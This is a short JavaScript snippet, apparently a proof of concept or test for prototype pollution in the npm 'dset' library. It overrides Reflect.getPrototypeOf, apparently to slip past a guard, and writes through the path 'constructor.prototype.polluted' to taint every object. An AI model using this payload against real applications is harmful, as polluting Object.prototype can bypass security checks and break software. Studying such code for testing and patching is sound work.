Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const dset = require('dset');
dset({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);